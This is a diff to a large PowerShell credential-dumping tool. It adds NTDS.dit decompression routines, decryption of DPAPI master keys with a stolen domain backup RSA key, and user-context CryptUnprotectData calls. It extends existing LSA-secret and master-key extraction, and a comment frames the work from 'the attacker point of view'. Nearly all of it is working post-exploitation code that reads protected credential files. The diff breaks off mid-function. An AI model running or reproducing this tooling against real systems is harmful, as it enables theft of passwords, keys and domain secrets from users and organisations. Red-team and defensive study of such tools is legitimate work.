@@ -67,12 +67,25 @@ function Pad($Value)
 }
 
 <#
-	Remove (last byte value) to bytes array
+	PKCS#7 Unpadding: Remove <last byte value> bytes from the end of the array
 #>
 function Unpad($Bytes)
 {
-	$NBBytesToRemove = [Uint32]$Bytes[$Bytes.Length-1]
-	return ($Bytes[0..$($Bytes.Length-$NBBytesToRemove-1)])
+	$blockSize = 8  # Block size for Triple DES (64 Bits) but use It also for AES (128 Bits)
+    $paddingValue = $Bytes[-1]
+
+    if ($Bytes.Count % $blockSize -eq 0)
+	{
+        $paddingBytes = $Bytes[-$paddingValue..-1]
+        if ($paddingBytes -eq $paddingValue)
+		{
+			# Data is indeed padded -> Unpad
+			return ($Bytes[0..$($Bytes.Length-$paddingValue-1)])
+        }
+    }
+
+	# Data is not paded
+	return $Bytes
 }
 
 <#
@@ -418,6 +431,183 @@ function PBKDF2_HMAC_SHA256 ($Pwd, $Salt, $Length, $Iterations)
     }
 
     return [byte[]]($Key[0..31])
+}
+
+<#######################>
+<#### NTDS functions ###>
+<#######################>
+
+function Decompress-Sevenbit($src, $wide)
+{
+	$res = @()
+	$val = 0
+	$shift = 0
+	foreach ($byte in $src)
+	{
+		$val = $val -bor ($byte -shl $shift)
+		$res += ($val -band 0x7F)
+
+		if ($wide)
+		{
+			$res += 0
+		}
+
+		$val = $val -shr 7
+		$shift += 1
+
+		if ($shift -eq 7)
+		{
+			$res += ($val -band 0x7F)
+
+			if ($wide)
+			{
+				$res += 0
+			}
+
+			$val = $val -shr 7
+			$shift = 0
+		}
+	}
+
+	return $res
+}
+
+function Decompress-Lzxpress($src)
+{
+    $offset = 0
+    $size = $src.Length
+    $res = @()
+    $bufferedFlags = 0
+    $bufferedFlagsCount = 0
+    $lastLengthHalfByte = 0
+
+    While ($offset -lt $size)
+	{
+        If ($bufferedFlagsCount -eq 0)
+		{
+            $bufferedFlags = [BitConverter]::ToUInt32($src[$offset..($offset + 3)], 0)
+            $bufferedFlagsCount = 32
+            $offset += 4
+        }
+
+        $bufferedFlagsCount -= 1
+        If ($bufferedFlags -band (1 -shl $bufferedFlagsCount) -eq 0)
+		{
+            $res += $src[$offset]
+            $offset += 1
+        }
+        Else
+		{
+            If ($offset -eq $size)
+			{
+                Break
+            }
+
+            $match = [BitConverter]::ToUInt16($src[$offset..($offset + 1)], 0)
+            $matchOffset = $match / 8
+            $matchLength = $match % 8
+            $matchOffset += 1
+
+            If ($matchLength -eq 7)
+			{
+                If ($lastLengthHalfByte -eq 0)
+				{
+                    $lastLengthHalfByte = $src[$offset]
+                    $offset += 1
+                    $matchLength = $lastLengthHalfByte % 16
+                }
+                Else
+				{
+                    $rewind = $offset
+                    $offset = $lastLengthHalfByte
+                    $matchLength = $src[$offset] / 16
+                    $offset = $rewind
+                    $lastLengthHalfByte = 0
+                }
+
+                If ($matchLength -eq 15)
+				{
+                    $matchLength = $src[$offset]
+                    $offset += 1
+
+                    If ($matchLength -eq 255)
+					{
+                        $matchLength = [BitConverter]::ToUInt16($src[$offset..($offset + 1)], 0)
+                        $offset += 2
+
+                        If ($matchLength -eq 0)
+						{
+                            $matchLength = [BitConverter]::ToUInt32($src[$offset..($offset + 3)], 0)
+                            $offset += 4
+
+                            If ($matchLength -lt (15 + 7))
+							{
+                                Write-Host "[-] Wrong match length"
+								return $Null
+                            }
+
+                            $matchLength -= (15 + 7)
+                        }
+                    }
+
+                    $matchLength += 15
+                }
+
+                $matchLength += 7
+            }
+
+            $matchLength += 3
+
+            for ($i = 0; $i -lt $matchLength; $i++)
+			{
+                $res += $res[-$matchOffset]
+            }
+        }
+    }
+
+    return $res
+}
+
+function Decompress($Chunk)
+{
+	$COMPRESSION_SCHEME = @{
+        COMPRESS_7BITASCII = 1
+        COMPRESS_7BITUNICODE = 2
+        COMPRESS_XPRESS = 3
+        COMPRESS_XPRESS9 = 5
+        COMPRESS_XPRESS10 = 6
+    }
+
+    $identifier = $Chunk[0] -shr 3
+
+    If ($identifier -eq $COMPRESSION_SCHEME['COMPRESS_7BITASCII'])
+	{
+        return (Decompress-Sevenbit $Chunk[1..($Chunk.Length - 1)] $False)
+    }
+    ElseIf ($identifier -eq $COMPRESSION_SCHEME['COMPRESS_7BITUNICODE'])
+	{
+        return (Decompress-Sevenbit $Chunk[1..($Chunk.Length - 1)] $True)
+    }
+    ElseIf ($identifier -eq $COMPRESSION_SCHEME['COMPRESS_XPRESS'])
+	{
+        # Assuming `lzxpress.decompress` is a custom function
+        return (Decompress-Lzxpress $Chunk[3..($Chunk.Length - 1)])
+    }
+    ElseIf ($identifier -eq $COMPRESSION_SCHEME['COMPRESS_XPRESS9'])
+	{
+		Write-Host("[-] Compression 'COMPRESS_XPRESS9' not implemented")
+		return $Null
+    }
+	ElseIf ($identifier -eq $COMPRESSION_SCHEME['COMPRESS_XPRESS10'])
+	{
+		Write-Host("[-] Compression 'COMPRESS_XPRESS10' not implemented")
+		return $Null
+    }
+    Else
+	{
+        # Not compressed
+        return $Chunk
+    }
 }
 
 <#######################>
@@ -2962,8 +3152,6 @@ function Get-LSASecrets($LSASecretKey)
 
 		$LSASecrets[$Child.PSChildName] = $LSASecret
 
-		Write-Host ($Child.PSChildName)
-
 		If ((-not $LSASecret["CurrVal"]) -or ($LSASecret["CurrVal"][0..1] -eq @(0, 0)))
 		{
 			Write-Host ("[+] Skipped {0} because no secrets" -f ($Child.PSChildName))
@@ -3513,7 +3701,18 @@ function Decrypt-MasterKey($MKType, $PreKeys, $Enc_Key, $HashAlgo, $CipherAlgo, 
 	return $Null
 }
 
-function ParseMasterKeyFile($PreKeys, $FileName)
+function Decrypt-DomainBackupMasterKey($Secret, $RSA)
+{
+	[Array]::Reverse($Secret)
+
+	# Decrypt using PKCS1v15 padding with $False
+	$Decrypted_Masterkey = $RSA.Decrypt($Secret, $False)[8..71]
+
+	Write-Host ("`t[+] Decrypted Domain Backup MasterKey with Domain Backup Key = {0}" -f ([System.BitConverter]::ToString($Decrypted_MasterKey).Replace("-", "")))
+	return $Decrypted_Masterkey
+}
+
+function ParseMasterKeyFile($PreKeys, $RSA, $FileName)
 {
 	<#
 		ParseMasterKeyFile:
@@ -3539,17 +3738,24 @@ function ParseMasterKeyFile($PreKeys, $FileName)
 	$MasterKeyFile = $MasterKeyFile[128..$($MasterKeyFile.Length-1)]
 	If ($MasterKeyLength -gt 0)
 	{
-		$Data = $MasterKeyFile[0..$($MasterKeyLength-1)]
-		# Structure from Pypykatz DPAPI/Structures/MasterKeyFile.py : MasterKey
-		$Version = $Data[0..3]
-		$Salt = $Data[4..19]
-		$IterationCount = [BitConverter]::ToUInt32($Data[20..23], 0)
-		$HashAlgo = [BitConverter]::ToUInt32($Data[24..27], 0)
-		$CipherAlgo = [BitConverter]::ToUInt32($Data[28..31], 0)
-		$Enc_Key = $Data[32..$($Data.Length-1)]
+		If (-not $RSA -or -not ($DomainBackupMasterKeyLength -gt 0))
+		{
+			$Data = $MasterKeyFile[0..$($MasterKeyLength-1)]
+			# Structure from Pypykatz DPAPI/Structures/MasterKeyFile.py : MasterKey
+			$Version = $Data[0..3]
+			$Salt = $Data[4..19]
+			$IterationCount = [BitConverter]::ToUInt32($Data[20..23], 0)
+			$HashAlgo = [BitConverter]::ToUInt32($Data[24..27], 0)
+			$CipherAlgo = [BitConverter]::ToUInt32($Data[28..31], 0)
+			$Enc_Key = $Data[32..$($Data.Length-1)]
 
-		$MasterKey = Decrypt-MasterKey "MasterKey" $PreKeys $Enc_Key ([UInt64]$HashAlgo) ([UInt64]$CipherAlgo) $Salt $IterationCount
-		If ($MasterKey) { $Keys["MasterKey"] = $MasterKey }
+			$MasterKey = Decrypt-MasterKey "MasterKey" $PreKeys $Enc_Key ([UInt64]$HashAlgo) ([UInt64]$CipherAlgo) $Salt $IterationCount
+			If ($MasterKey) { $Keys["MasterKey"] = $MasterKey }
+		}
+		Else
+		{
+			Write-Host("`t[+] Master Key File can be decrypted with Domain Backup Key")
+		}
 
 		$MasterKeyFile = $MasterKeyFile[$($MasterKeyLength)..$($MasterKeyFile.Length-1)]
 	}
@@ -3590,9 +3796,6 @@ function ParseMasterKeyFile($PreKeys, $FileName)
 	}
 	If ($DomainBackupMasterKeyLength -gt 0)
 	{
-		# Not implemented Domain Backup Master Key decryption for now
-
-		<#
 		$Data = $MasterKeyFile[0..$($DomainBackupMasterKeyLength-1)]
 		# Structure from Pypykatz DPAPI/Structures/MasterKeyFile.py : DomainKey
 		$Version = $Data[0..3]
@@ -3601,14 +3804,16 @@ function ParseMasterKeyFile($PreKeys, $FileName)
 		$GUID = $Data[12..27]
 		$Secret = $Data[28..$(28+($SecretLength-1))]
 		$AccessCheck = $Data[$(28+$SecretLength)..$(28+$SecretLength+$AccessCheckLength-1)]
-		$Keys["DomainBackupMasterKey"] = Decrypt-DomainBackupMasterKey ...
-		#>
+		If ($RSA)
+		{
+			$Keys["MasterKey"] = Decrypt-DomainBackupMasterKey $Secret $RSA
+		}
 	}
 
 	return ($MKGUID, $Keys)
 }
 
-function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSASS_MasterKeys)
+function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSASS_MasterKeys, $DomainBackupKey)
 {
 	<#
 		Get-MasterKeysFromFiles:
@@ -3619,7 +3824,7 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 				- C:\Windows\System32\Microsoft\Protect\<MKGUID> (System Machine Master Key File)
 	#>
 
-	Write-Host ("[===] Try to decrypt all Master Keys Files with LSA DPAPI PreKeys [===]")
+	Write-Host ("[===] Try to decrypt all Master Keys Files [===]")
 
 	# Recover all Pre Keys
 	Write-Host ("[+] Compute PreKeys")
@@ -3630,6 +3835,32 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 	}
 
 	$MasterKeys = @{}
+
+	# Get RSA Decryptor with Domain Backup Key
+	If ($DomainBackupKey)
+	{
+		$RSA = New-Object System.Security.Cryptography.RSACryptoServiceProvider
+		
+		# ImportParameters requires argument in Big-Endian -> Reverse arrays
+		$rsaParams = New-Object System.Security.Cryptography.RSAParameters
+		[Array]::Reverse($DomainBackupKey['Modulus'])
+		$rsaParams.Modulus = $DomainBackupKey['Modulus']
+		[Array]::Reverse($DomainBackupKey['PubExp'])
+		$rsaParams.Exponent = $DomainBackupKey['PubExp']
+		[Array]::Reverse($DomainBackupKey['P'])
+		$rsaParams.P = $DomainBackupKey['P']
+		[Array]::Reverse($DomainBackupKey['Q'])
+		$rsaParams.Q = $DomainBackupKey['Q']
+		[Array]::Reverse($DomainBackupKey['DP'])
+		$rsaParams.DP = $DomainBackupKey['DP']
+		[Array]::Reverse($DomainBackupKey['DQ'])
+		$rsaParams.DQ = $DomainBackupKey['DQ']
+		[Array]::Reverse($DomainBackupKey['IQ'])
+		$rsaParams.InverseQ = $DomainBackupKey['IQ']
+		[Array]::Reverse($DomainBackupKey['D'])
+		$rsaParams.D = $DomainBackupKey['D']
+		$RSA.ImportParameters($rsaParams)
+	}
 
 	# Get Users' Master Keys decrypted
 	$UserMasterKeys = @{}
@@ -3659,10 +3890,10 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 						}
 					}
 
-					# Else try to decrypt It with PreKeys
+					# Else try to decrypt It with PreKeys or Domain Backup Key
 					If (-not $Found)
 					{
-						$MKGUID, $Keys = ParseMasterKeyFile $PreKeys "C:\Users\$User\AppData\Roaming\Microsoft\Protect\$SID\$UserMasterKeyFileName"
+						$MKGUID, $Keys = ParseMasterKeyFile $PreKeys $RSA "C:\Users\$User\AppData\Roaming\Microsoft\Protect\$SID\$UserMasterKeyFileName"
 						If ($Keys.Count -ne 0) { $UserMasterKeys[$MKGUID] = $Keys }
 					}
 				}
@@ -3704,10 +3935,10 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 								}
 							}
 
-							# Else try to decrypt It with PreKeys
+							# Else try to decrypt It with PreKeys or Domain Backup Key
 							If (-not $Found)
 							{
-								$MKGUID, $Keys = ParseMasterKeyFile $PreKeys "C:\Windows\System32\Microsoft\Protect\$SID\User\$SystemUserMasterKeyFileName"
+								$MKGUID, $Keys = ParseMasterKeyFile $PreKeys $RSA "C:\Windows\System32\Microsoft\Protect\$SID\User\$SystemUserMasterKeyFileName"
 								If ($Keys.Count -ne 0) { $SystemMasterKeys[$MKGUID] = $Keys }
 							}
 						}
@@ -3733,10 +3964,10 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 						}
 					}
 
-					# Else try to decrypt It with PreKeys
+					# Else try to decrypt It with PreKeys or Domain Backup Key
 					If (-not $Found)
 					{
-						$MKGUID, $Keys = ParseMasterKeyFile $PreKeys "C:\Windows\System32\Microsoft\Protect\$SID\$SystemMachineMasterKeyFileName"
+						$MKGUID, $Keys = ParseMasterKeyFile $PreKeys $RSA "C:\Windows\System32\Microsoft\Protect\$SID\$SystemMachineMasterKeyFileName"
 						If ($Keys.Count -ne 0) { $SystemMasterKeys[$MKGUID] = $Keys }
 					}
 				}
@@ -3776,232 +4007,325 @@ function MKGUID($Data)
 	return "$Data1-$Data2-$Data3-$Data4-$Data5"
 }
 
-# Implementation of CryptUnprotectData() of Windows API
-# Calling the function CryptUnprotectData() in the context of a user allow to Recover the secret, encrypted with User MasterKey (which is encrypted with User PreKey), without providing his password
-# From the attacker point of view, we are administrator of the computer and we may have gathered password/NT hash for a specific user
-# => So we have to implement the cryptographic decryption process of CryptUnprotectData() from Windows API to provide gathered MasterKeys
-function Decrypt-DPAPIBlob($Blob, $MasterKeys, $Entropy)
+# Two cases when trying to decrypt DPAPI Blob
+#	- In the context of the user that own the DPAPI Secrets -> Simply call CryptUnprotectData() -> No need to any MasterKeys
+#		- Calling this function in the context of the owner will blindly decrypt the DPAPI Blob without asking any pwds
+#	- The DPAPI Secret is not owned by our current user -> We need Masterkeys and implement the cryptographic decryption process of CryptUnprotectData() from Windows API to provide gathered MasterKeys
+function Decrypt-DPAPIBlob($Blob, $MasterKeys, $Entropy, $InUserContext, $NoMasterKeysDecryption)
 {
 	<#
-		Decrypt-DPAPIBlob: Decrypt a DPAPI Blob with all gathered MasterKeys
+		Decrypt-DPAPIBlob: Decrypt a DPAPI Blob with all gathered MasterKeys or in the context of the current user
 	#>
 
-	# Load C# Registry Key functions
-	If (-Not (Test-Path Variable:Global:ALG_CLASS_ANY))
+	If ($InUserContext)
 	{
-		LoadCryptoConstants
+		If (-not ([System.Management.Automation.PSTypeName]'CryptUnprotectHelper').Type)
+		{
+			# Define the C# code for the CryptUnprotectData function
+			$CryptUnprotectCode = @"
+			using System;
+			using System.Runtime.InteropServices;
+
+			public class CryptUnprotectHelper
+			{
+				[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+				public struct DATA_BLOB
+				{
+					public int cbData;
+					public IntPtr pbData;
+				}
+
+				[DllImport("Kernel32.dll")]
+				public static extern uint GetLastError();
+
+				[DllImport("Crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+				[return: MarshalAs(UnmanagedType.Bool)]
+				public static extern bool CryptUnprotectData(
+					ref DATA_BLOB pDataIn,
+					IntPtr ppszDataDescr,
+					ref DATA_BLOB pOptionalEntropy,
+					IntPtr pvReserved,
+					IntPtr pPromptStruct,
+					int dwFlags,
+					ref DATA_BLOB pDataOut
+				);
+			}
+"@
+
+			Add-Type -TypeDefinition $CryptUnprotectCode
+		}
+
+		# Create a DATA_BLOB structure for the encrypted data
+		$dataIn = New-Object CryptUnprotectHelper+DATA_BLOB
+		$dataIn.cbData = $Blob.Length
+		$dataIn.pbData = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Blob.Length)
+		[System.Runtime.InteropServices.Marshal]::Copy($Blob, 0, $dataIn.pbData, $Blob.Length)
+
+		# Create a DATA_BLOB structure for pOptionalEntropy
+		$optionalEntropy = New-Object CryptUnprotectHelper+DATA_BLOB
+		If ($Entropy)
+		{
+			
+			$optionalEntropy.cbData = $Entropy.Length
+			$optionalEntropy.pbData = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Entropy.Length)
+			[System.Runtime.InteropServices.Marshal]::Copy($Entropy, 0, $optionalEntropy.pbData, $Entropy.Length)
+		}
+
+		# Create a DATA_BLOB structure for the output
+		$dataOut = New-Object CryptUnprotectHelper+DATA_BLOB
+
+		# Call CryptUnprotectData
+		$Res = [CryptUnprotectHelper]::CryptUnprotectData(
+			[ref]$dataIn,
+			[IntPtr]::Zero,
+			[ref]$optionalEntropy,
+			[IntPtr]::Zero,
+			[IntPtr]::Zero,
+			0,
+			[ref]$dataOut
+		)
+
+		# Retrieve the decrypted data from the DATA_BLOB structure
+		If ($Res)
+		{
+			$ClearText = @()
+			For ($i = 0; $i -lt $dataOut.cbData; $i += 1)
+			{
+				$ClearText += [System.Runtime.InteropServices.Marshal]::ReadByte($dataOut.pbData, $i)
+			}
+		}
+		
+		# Free the allocated memory
+		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($dataIn.pbData)
+		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($dataOut.pbData)
 	}
 
-	# Parse DPAPI Blob
-	# Structure from Pypykatz DPAPI/Structures/Blob.py : DPAPI_BLOB
-	$Version = $Blob[0..3]
-	$Credential_GUID = $Blob[4..19]
-	$Signature_Start_POS = 20
-	$X = $Signature_Start_POS
-	$Y = $X + 4
-	$MasterKey_Version = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
-	$X = $Y
-	$Y = $X + 16
-	$MasterKey_GUID = MKGUID ($Blob[$($X)..$($Y-1)])
-	$X = $Y
-	$Y = $X + 4
-	$Flags = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
-	$X = $Y
-	$Y = $X + 4
-	$DescriptionLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
-	$X = $Y
-	$Y = $X + $DescriptionLength
-	$Description = [BitConverter]::ToUInt16($Blob[$($X)..$($Y-1)], 0)
-	$X = $Y
-	$Y = $X + 4
-	$CipherAlgo = [UInt64]([BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0))
-	$X = $Y
-	$Y = $X + 4
-	$CipherLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
-	$X = $Y
-	$Y = $X + 4
-	$SaltLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
-	$X = $Y
-	$Y = $X + $SaltLength
-	$Salt = $Blob[$($X)..$($Y-1)]
-	$X = $Y
-	$Y = $X + 4
-	$HMACKeyLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
-	If ($HMACKeyLength -ge 1)
+	If (-not $ClearText -and -not $NoMasterKeysDecryption)
 	{
+		If ($InUserContext)
+		{
+			Write-Host("`t[-] DPAPI Blob decryption in user context failed with error {0}" -f ([CryptUnprotectHelper]::GetLastError()))
+			Write-Host("`t[+] Falling back to decrption with MasterKeys")
+		}
+
+		# Load C# Registry Key functions
+		If (-Not (Test-Path Variable:Global:ALG_CLASS_ANY))
+		{
+			LoadCryptoConstants
+		}
+
+		# Parse DPAPI Blob
+		# Structure from Pypykatz DPAPI/Structures/Blob.py : DPAPI_BLOB
+		$Version = $Blob[0..3]
+		$Credential_GUID = $Blob[4..19]
+		$Signature_Start_POS = 20
+		$X = $Signature_Start_POS
+		$Y = $X + 4
+		$MasterKey_Version = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
 		$X = $Y
-		$Y = $X + $HMACKeyLength
-		$HMACKey = $Blob[$($X)..$($Y-1)]
-	}
-	Else { $HMACKey = [byte[]]@() }
-	$X = $Y
-	$Y = $X + 4
-	$HashAlgo = [UInt64]([BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0))
-	$X = $Y
-	$Y = $X + 4
-	$HashLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
-	$X = $Y
-	$Y = $X + 4
-	$HMACLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
-	$X = $Y
-	$Y = $X + $HMACLength
-	$HMAC = $Blob[$($X)..$($Y-1)]
-	$X = $Y
-	$Y = $X + 4
-	$DataLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
-	$X = $Y
-	$Y = $X + $DataLength
-	$Data = $Blob[$($X)..$($Y-1)]
-	$Signature_End_POS = $Y
-
-	$ToSign = $Blob[$($Signature_Start_POS)..$($Signature_End_POS-1)]
-	$X = $Y
-	$Y = $X + 4
-	$SignatureLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
-	$X = $Y
-	$Y = $X + $SignatureLength
-	$Signature = $Blob[$($X)..$($Y-1)]
-
-	function FixParity($DESKey)
-	{
-		$Temp = [byte[]]@()
-		For ($i = 0; $i -lt $DESKey.Length; $i += 1)
+		$Y = $X + 16
+		$MasterKey_GUID = MKGUID ($Blob[$($X)..$($Y-1)])
+		$X = $Y
+		$Y = $X + 4
+		$Flags = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
+		$X = $Y
+		$Y = $X + 4
+		$DescriptionLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
+		$X = $Y
+		$Y = $X + $DescriptionLength
+		$Description = [BitConverter]::ToUInt16($Blob[$($X)..$($Y-1)], 0)
+		$X = $Y
+		$Y = $X + 4
+		$CipherAlgo = [UInt64]([BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0))
+		$X = $Y
+		$Y = $X + 4
+		$CipherLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
+		$X = $Y
+		$Y = $X + 4
+		$SaltLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
+		$X = $Y
+		$Y = $X + $SaltLength
+		$Salt = $Blob[$($X)..$($Y-1)]
+		$X = $Y
+		$Y = $X + 4
+		$HMACKeyLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
+		If ($HMACKeyLength -ge 1)
 		{
-			$T = [Convert]::ToString($DESKey[$($i)], 2)
-			$T = "0" * (8 - $T.Length) + $T
-			If (($T[0..6] -eq "1").Count % 2 -eq 0)
+			$X = $Y
+			$Y = $X + $HMACKeyLength
+			$HMACKey = $Blob[$($X)..$($Y-1)]
+		}
+		Else { $HMACKey = [byte[]]@() }
+		$X = $Y
+		$Y = $X + 4
+		$HashAlgo = [UInt64]([BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0))
+		$X = $Y
+		$Y = $X + 4
+		$HashLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
+		$X = $Y
+		$Y = $X + 4
+		$HMACLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
+		$X = $Y
+		$Y = $X + $HMACLength
+		$HMAC = $Blob[$($X)..$($Y-1)]
+		$X = $Y
+		$Y = $X + 4
+		$DataLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
+		$X = $Y
+		$Y = $X + $DataLength
+		$Data = $Blob[$($X)..$($Y-1)]
+		$Signature_End_POS = $Y
+
+		$ToSign = $Blob[$($Signature_Start_POS)..$($Signature_End_POS-1)]
+		$X = $Y
+		$Y = $X + 4
+		$SignatureLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
+		$X = $Y
+		$Y = $X + $SignatureLength
+		$Signature = $Blob[$($X)..$($Y-1)]
+
+		function FixParity($DESKey)
+		{
+			$Temp = [byte[]]@()
+			For ($i = 0; $i -lt $DESKey.Length; $i += 1)
 			{
-				$Temp += ([BitConverter]::GetBytes([Convert]::ToUInt32($T.Substring(0,7) + "1", 2)))[0]
+				$T = [Convert]::ToString($DESKey[$($i)], 2)
+				$T = "0" * (8 - $T.Length) + $T
+				If (($T[0..6] -eq "1").Count % 2 -eq 0)
+				{
+					$Temp += ([BitConverter]::GetBytes([Convert]::ToUInt32($T.Substring(0,7) + "1", 2)))[0]
+				}
+				Else
+				{
+					$Temp += ([BitConverter]::GetBytes([Convert]::ToUInt32($T.Substring(0,7) + "0", 2)))[0]
+				}
 			}
-			Else
-			{
-				$Temp += ([BitConverter]::GetBytes([Convert]::ToUInt32($T.Substring(0,7) + "0", 2)))[0]
-			}
+
+			return $Temp
 		}
 
-		return $Temp
-	}
-
-	$MasterKeyFound = $False
-	ForEach ($MKType in $MasterKeys.Keys)
-	{
-		ForEach ($MKGUID in $MasterKeys[$MKType].Keys)
+		$MasterKeyFound = $False
+		ForEach ($MKType in $MasterKeys.Keys)
 		{
-			If ($MKGUID -eq $MasterKey_GUID)
+			ForEach ($MKGUID in $MasterKeys[$MKType].Keys)
 			{
-				$MasterKey = $MasterKeys[$MKType][$MKGUID]["MasterKey"]
-				$MasterKeyFound = $True
-				Break
+				If ($MKGUID -eq $MasterKey_GUID)
+				{
+					$MasterKey = $MasterKeys[$MKType][$MKGUID]["MasterKey"]
+					$MasterKeyFound = $True
+					Break
+				}
 			}
+
+			If ($MasterKeyFound) { Break }
 		}
 
-		If ($MasterKeyFound) { Break }
-	}
+		If (-not $MasterKeyFound)
+		{
+			Write-Host ("`t[-] MasterKey with GUID {0} not found for decryption" -f ($MasterKey_GUID))
+			return $Null
+		}
 
-	If (-not $MasterKeyFound)
-	{
-		Write-Host ("`t[-] MasterKey with GUID {0} not found for decryption" -f ($MasterKey_GUID))
-		return $Null
-	}
-
-	$MasterKeyHash = [System.Security.Cryptography.SHA1]::Create().ComputeHash($MasterKey)
-	Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
-	{
-		"SHA1" { $Hasher = New-Object System.Security.Cryptography.HMACSHA1 }
-		"SHA512" { $Hasher = New-Object System.Security.Cryptography.HMACSHA512 }
-	}
-	If ($Entropy) { $ToHash = $Salt + $Entropy }
-	Else { $ToHash = $Salt }
-	$Hasher.Key = $MasterKeyHash
-	$SessionKey = $Hasher.ComputeHash($ToHash)
-
-	If ($SessionKey.Length -gt ($Global:ALGORITHMS_DATA[$HashAlgo])[4])
-	{
-		$Hasher.Key = $SessionKey
-		$DerivedKey = $Hasher.ComputeHash(@())
-	}
-	Else
-	{
-		$DerivedKey = $SessionKey
-	}
-
-	If ($DerivedKey.Length -lt ($Global:ALGORITHMS_DATA[$CipherAlgo])[0])
-	{
-		$DerivedKey += (,([byte]0) * ($Global:ALGORITHMS_DATA[$HashAlgo])[4])
-		$X = [byte[]]@()
-		ForEach ($i in $DerivedKey) { $X += ($i -bxor 0x36) }
-		$IPAD = $X[0..$(($Global:ALGORITHMS_DATA[$HashAlgo])[4]-1)]
-		$X = [byte[]]@()
-		ForEach ($i in $DerivedKey) { $X += ($i -bxor 0x5c) }
-		$OPAD = $X[0..$(($Global:ALGORITHMS_DATA[$HashAlgo])[4]-1)]
-
+		$MasterKeyHash = [System.Security.Cryptography.SHA1]::Create().ComputeHash($MasterKey)
 		Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
 		{
-			"SHA1" { $X = [System.Security.Cryptography.SHA1]::Create().ComputeHash($IPAD); $Y = [System.Security.Cryptography.SHA1]::Create().ComputeHash($OPAD) }
-			"SHA512" { $X = [System.Security.Cryptography.SHA512]::Create().ComputeHash($IPAD); $Y = [System.Security.Cryptography.SHA512]::Create().ComputeHash($OPAD) }
+			"SHA1" { $Hasher = New-Object System.Security.Cryptography.HMACSHA1 }
+			"SHA512" { $Hasher = New-Object System.Security.Cryptography.HMACSHA512 }
 		}
-		$DerivedKey = FixParity ($X + $Y)
-	}
+		If ($Entropy) { $ToHash = $Salt + $Entropy }
+		Else { $ToHash = $Salt }
+		$Hasher.Key = $MasterKeyHash
+		$SessionKey = $Hasher.ComputeHash($ToHash)
 
-	$Key = $DerivedKey[0..$(($Global:ALGORITHMS_DATA[$CipherAlgo])[0]-1)]
-	$Mode = ($Global:ALGORITHMS_DATA[$CipherAlgo])[2]
-	$IV = (,([byte]0) * (($Global:ALGORITHMS_DATA[$CipherAlgo])[3]))
-	Switch ($CipherAlgo)
-	{
-		$Global:ALGORITHMS["CALG_3DES"] { $X = TripleDESTransform $Key $Data $IV $Mode $False }
-		$Global:ALGORITHMS["CALG_AES_256"] { $X = AESTransform $Key $Data $IV ([Security.Cryptography.CipherMode]::CBC) $False }
-	}
-	$ClearText = Unpad ($X)
+		If ($SessionKey.Length -gt ($Global:ALGORITHMS_DATA[$HashAlgo])[4])
+		{
+			$Hasher.Key = $SessionKey
+			$DerivedKey = $Hasher.ComputeHash(@())
+		}
+		Else
+		{
+			$DerivedKey = $SessionKey
+		}
 
-	# Calculate the different HMACKeys
-	Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
-	{
-		"SHA1" { $HashBlockSize = 64 }
-		"SHA512" { $HashBlockSize = 128 }
-	}
-	$MasterKeyHash2 = $MasterKeyHash + (,([byte]0) * $HashBlockSize)
-	$X = [byte[]]@()
-	ForEach ($i in $MasterKeyHash2) { $X += ($i -bxor 0x36) }
-	$IPAD = $X[0..$($HashBlockSize-1)]
-	$X = [byte[]]@()
-	ForEach ($i in $MasterKeyHash2) { $X += ($i -bxor 0x5c) }
-	$OPAD = $X[0..$($HashBlockSize-1)]
+		If ($DerivedKey.Length -lt ($Global:ALGORITHMS_DATA[$CipherAlgo])[0])
+		{
+			$DerivedKey += (,([byte]0) * ($Global:ALGORITHMS_DATA[$HashAlgo])[4])
+			$X = [byte[]]@()
